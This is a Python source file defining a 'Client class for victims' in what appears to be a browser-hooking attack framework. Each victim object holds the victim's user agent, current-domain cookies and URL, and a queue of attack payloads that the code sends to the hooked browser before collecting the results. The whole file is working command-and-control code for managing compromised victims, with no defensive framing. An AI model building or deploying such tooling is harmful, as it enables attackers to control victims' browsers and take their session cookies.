import json
from queue import Queue
from .Module import Module
import time
import threading 
import  _thread

class Client:
    '''
    Client class for victims.
    Every client has its own client object owned by a project
    In every client object, there is a unique clientid and its own taskqueue
    '''
    def __init__(self,clientid,project,clientinfo) -> None:
        self.clientid=clientid
        self.project=project
        self.useragent=clientinfo['useragent']
        self.curdomaincookies=clientinfo['curdomaincookies']
        self.cururl=clientinfo['cururl']
        self.taskqueue=Queue()
        self.stopattack=False
        self.taskresult={}
        self.tasksemaphore={}

    def pop_latest_task(self):
        '''
        Pops the latest task from task queue of this victim
        If there are no tasks, it returns None
        '''
        try:
            return self.taskqueue.get(False)
        except:
            return None

    def stop_attack(self):
        '''
        Stops attacks on this client immediately
        This function clears task queue and set stopattack=True to prevent further attacks
        '''
        self.stopattack=True
        self.taskqueue=Queue()

    
    def send_payload(self,moduleobj:Module,callback:callable=None):
        '''
        Receives an attack module object and send the payload to the client
        By default, this function waits for the result of execution and returns the result
        If an callback parameter is a callable function was passed in, it starts a new thread to pass result of execution and pass it to callback function and returns taskid
        If the callback parameter is not callable, it simply send the payload to the client and return the taskid (so that when you want to send a payload asynchronously, you don't have to create a useless function to be passed in)
        '''
        if self.stopattack:
            raise Exception("Attack on this client should be stopped")
        payload=moduleobj.payload
        payload.set_client(self)
        taskid=payload.taskid
        semaphore=threading.Semaphore(0)
        self.tasksemaphore[taskid]=semaphore
        self.taskqueue.put(payload)
        if not callback:
            semaphore.acquire()
            return self.taskresult[taskid] 
        elif callable(callback):
            def thread_callback():
                semaphore.acquire()
                callback(self,self.taskresult[taskid] ) #callback(client,)
            _thread.start_new_thread( thread_callback, tuple())
        return taskid
    
    def get_taskresult(self,taskid:str):
        '''
        Gets task result from a specified taskid.
        If there is no result, it returns None
        '''
        if taskid in self.taskresult:
            return self.taskresult[taskid] 
        return None